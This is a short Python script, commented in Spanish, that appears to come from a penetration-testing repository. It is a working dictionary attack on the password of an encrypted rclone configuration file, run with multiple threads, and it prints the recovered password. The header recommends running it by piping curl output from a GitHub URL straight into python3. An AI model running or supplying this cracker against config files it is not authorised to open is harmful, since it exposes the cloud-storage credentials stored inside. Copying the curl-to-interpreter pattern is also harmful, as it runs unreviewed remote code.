#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él.

# ----------
# Script de NiPeGun para probar contraseñas de un archivo rclone.conf cifrado usando un diccionario de contraseñas, con barra de progreso y multihilo.
#
# Ejecución remota:
#  curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/2-Exploit/RClone/EncryptedConfigFile-Crack.py | python3 - [RutaWordList] [RutaArchivoConfRClone]
# ----------

import sys
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm  # Requiere: pip install tqdm

def probar_contraseña(vPass, vConfCifrado):
  vPass = vPass.strip()
  if not vPass:
    return None
  comando = ['rclone', 'config', 'show', '--config', vConfCifrado]
  try:
    resultado = subprocess.run(
      comando,
      env={'RCLONE_CONFIG_PASS': vPass},
      stdout=subprocess.DEVNULL,
      stderr=subprocess.DEVNULL,
      timeout=3
    )
    if resultado.returncode == 0:
      return vPass
  except subprocess.TimeoutExpired:
    pass
  return None

def main():
  if len(sys.argv) != 3:
    print(f"Uso: {sys.argv[0]} [ruta_diccionario.txt] [ruta_config.conf]")
    sys.exit(1)

  vDiccionario = sys.argv[1]
  vConfCifrado = sys.argv[2]

  try:
    with open(vDiccionario, 'r', encoding='utf-8', errors='ignore') as f:
      aContraseñas = [line.strip() for line in f if line.strip()]
  except FileNotFoundError:
    print(f"El archivo de diccionario '{vDiccionario}' no existe.")
    sys.exit(2)

  print(f"[*] Probando {len(aContraseñas)} contraseñas...\n")
  encontrada = None

  with ThreadPoolExecutor(max_workers=8) as executor:
    futuros = {executor.submit(probar_contraseña, vPass, vConfCifrado): vPass for vPass in aContraseñas}
    with tqdm(total=len(futuros), desc="Progreso", unit="pass", ncols=100) as barra:
      for futuro in as_completed(futuros):
        barra.update(1)
        resultado = futuro.result()
        if resultado:
          encontrada = resultado
          barra.close()
          print(f"\n[+] ¡Contraseña encontrada!: {encontrada}")
          executor.shutdown(wait=False, cancel_futures=True)
          return

  print("[-] No se encontró la contraseña en el diccionario.")

if __name__ == "__main__":
  main()
